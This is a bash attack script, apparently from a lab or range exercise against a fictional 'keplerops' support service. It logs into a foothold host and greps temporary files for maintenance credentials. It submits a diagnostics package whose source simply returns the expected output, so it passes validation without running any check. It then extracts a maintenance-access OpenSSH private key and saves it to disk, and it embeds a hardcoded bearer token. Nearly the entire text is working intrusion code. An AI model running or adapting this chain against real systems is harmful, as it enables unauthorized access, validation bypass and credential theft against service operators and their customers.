#!/bin/bash
SSH="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -i $HOME/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
$SSH 'bash -s' <<'INNER'
echo "===== rk.py"; cat /tmp/rk.py 2>&1
echo "===== grep maintenance in /tmp"
grep -rniI "maintenance_access\|maintenance_user\|\"host\"" /tmp/*.json /tmp/*.py /tmp/*.out /tmp/*.txt 2>/dev/null | grep -i 'maint\|host\|arwc' | head -30
echo "===== reproduce diagnostic deliver and print access fields"
python3 - <<'PY'
import json,subprocess,os
CA=os.path.expanduser('~/.local/share/keplerops/ca.crt')
SB='Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b'
B='https://support.keplerops.test:8443'
def call(method,url,data=None):
    a=['curl','--cacert',CA,'-s','-m','15','-X',method,'-H','Authorization: '+SB,'-H','Content-Type: application/json',url]
    if data is not None:a+=['-d',json.dumps(data)]
    return subprocess.run(a,capture_output=True,text=True).stdout
SUM={"asset_id":"CRR-OG2","captured_at":"2026-09-18T14:22:16Z","connector_revision":"FLK-7.4.2","observations":[{"check":"connector-heartbeat","latency_ms":1840,"status":"delayed"},{"check":"archive-synchronization","records":28,"status":"ok"}],"assessment":{"rating":"callback-review-required","summary":"Cinder review: heartbeat latency 1840 ms exceeds the 250 ms connector limit while 28 records remain synchronized; support follow-up required."}}
src='var s='+json.dumps(SUM)+';function diagnostic_summary(i){return s;}try{module.exports.diagnostic_summary=diagnostic_summary;}catch(e){}'
j=call('POST',B+'/api/customers/TEN-ARWC-047/diagnostics',{"connector_revision":"FLK-7.4.2"})
print("JOBRESP",j[:400])
try: J=json.loads(j)['job_id']
except Exception as e: print("ERR",e); raise SystemExit
print("PUT",call('PUT',B+'/api/diagnostics/'+J+'/package',{"expected_output":SUM,"interface":"fieldkest.connector/v3","source":src})[:200])
d=call('POST',B+'/api/diagnostics/'+J+'/deliver',{})
print("DELIVER",d[:4000])
open('/tmp/w10_deliver.json','w').write(d)
try:
    o=json.loads(d)
    open('/tmp/w10_key','w').write(o['maintenance_access']['private_key_openssh']); os.chmod('/tmp/w10_key',0o600)
    print("ACCESS",json.dumps({k:v for k,v in o['maintenance_access'].items() if 'key' not in k}))
except Exception as e: print("parse",e)
PY
echo "===== access record"
cat /tmp/w10_deliver.json 2>/dev/null | python3 -c 'import json,sys
try:
 d=json.load(sys.stdin); ma=d.get("maintenance_access",{}); print({k:v for k,v in ma.items() if "key" not in k})
 print("top keys",list(d))
except Exception as e: print("ERR",e)'
INNER
